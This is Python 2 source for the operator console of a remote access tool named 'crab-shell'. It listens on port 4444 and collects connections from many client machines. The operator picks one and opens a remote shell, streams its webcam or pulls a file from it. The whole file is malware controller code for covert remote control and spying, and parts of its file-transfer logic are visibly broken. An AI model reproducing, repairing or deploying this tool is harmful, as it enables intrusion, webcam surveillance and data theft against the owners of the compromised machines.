import sys
sys.path.insert(0, '\Tools')
import Settings
import server
import socket
import Queue
from threading import Thread
import cv2
import pickle

job_number=[1,2]
q=Queue.Queue()
connections=[]
adresses=[]

Settings.banner()

def c_s():
    global s
    global host
    global port
    host="0.0.0.0"
    port=4444
    try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
       print "Socket Created Successfully\n"
    except:
       print "Faild! to create socket\n" 
  

def b_s():
 try :   
    s.bind((host,port))
    s.listen(5)
    print "Bind Success"
 except:
    print "Faild! Binding\n" 





 
def a_c():
   for c in connections:
        c.close()

   del connections[:]
   del adresses[:]
   while True:
    try:  
      clt,addr=s.accept()
      s.setblocking(1)
      connections.append(clt)
      adresses.append(addr)
      print "\nClient " + str(addr[0]) + " Is Connected Now"
      
    except:
      print "Error Accepting Connections"





def list_connections():
    
    print "   ---Active connections---"
    for i,clt in enumerate(connections):
        try:
          clt.send(' ')
          clt.recv(5000)
          print str(i) + "  "+ str(adresses[i][0])+ " at " +str(adresses[i][1]) + "\n"
        except:
           del adresses[i]
           del connections[i]
           continue
        

def get_target(cmd):
    global target
    try:         
           target=int(cmd.replace('select','')) 
           clt=connections[target]
           print "Your are now connected with " + str(adresses[target][0])
    
           return clt
    except:
           print "Traget Not Found"
           return None


def cam(conn):
     while True:
       data=conn.recv(9999999)
       frame = pickle.loads(data)
       cv2.imshow('Frame', frame)
       if cv2.waitKey(1) & 0xFF == ord('q'):  
         cv2.destroyAllWindows()  
         break
     
     



def shell_input(target):
    global shell
    shell = raw_input(adresses[target][0]+">")
    

def crab(): 
   while True:
    cmd=raw_input("crab-shell>")
    if cmd == "list":
        list_connections()
    elif "select" in cmd:
       clt=get_target(cmd)
       if clt:
        while True:
           shell_input(target)
           if shell == "shell":
               try:
                  clt.send(shell)
                  server.recv_cmd(clt)
               except:
                   print "\nOopss there was an error maybe target is down try list again to see\n\n"
                   break
           elif shell=="cam":
                  clt.send(shell)
                  cam(clt)     
           elif shell == "quit":
                 break
           elif shell == "send":
                clt.send(shell)
               
                f = open('file.txt','wb')
                
                print l
                while(True):
                    l=clt.recv(9999999999999)
                    
                    if not l:
                        break
                f.write(l)
                f.close()               
                    
                
                

        
    elif cmd == "help":
        Settings.helper()
    else:
        continue
    








def threads():
  for i in range(2):
      t=Thread(target=work,args=())
      t.daemon=True
      t.start()


def work():
    while True:
        x=q.get()
        if x==1:
            c_s()
            b_s()
            a_c()
        if x==2:
           crab()
        q.task_done()   

def job():
    for i in range(1,3):
        q.put(i)
    q.join()


threads()
job()
























